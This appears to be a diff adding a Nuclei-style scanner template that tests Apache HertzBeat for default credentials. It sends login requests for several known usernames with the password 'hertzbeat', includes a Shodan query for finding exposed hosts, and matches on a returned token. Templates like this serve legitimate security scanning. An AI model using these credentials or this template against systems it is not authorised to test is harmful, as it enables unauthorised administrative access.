@@ -1,0 +1,55 @@
+id: apache-hertzbeat-default-login
+
+info:
+  name: Apache HertzBeat - Default Credentials
+  author: securitytaters,icarot
+  severity: high
+  description: |
+    Apache HertzBeat enables default admin (and others) credentials. An attacker can execute unauthorized operations.
+  reference:
+    - https://github.com/apache/hertzbeat
+  metadata:
+    max-request: 4
+    verified: true
+    shodan-query: title:"HertzBeat"
+  tags: apache,hertzbeat,default-login
+
+variables:
+  password: hertzbeat
+
+http:
+  - raw:
+      - |
+        POST /api/account/auth/form HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"type":0,"identifier":"{{username}}","credential":"{{password}}"}
+
+    attack: pitchfork
+    payloads:
+      username:
+        - admin
+        - tom
+        - guest
+        - lili
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"token":'
+          - '{"data":{'
+          - 'role":'
+        condition: and
+
+      - type: word
+        part: content_type
+        words:
+          - 'application/json'
+
+      - type: status
+        status:
+          - 200
+# digest: 4a0a0047304502201d1f673e9773cd922b0e5818a8c1a81a13e75a9e5f73581ad1313c0c1f55083d0221008a7387d75d9f7cd8cd8f3e14a6bc90651c31365752ebbbc14f1f08e41a8198e9:922c64590222798bb761d5b6d8e72950
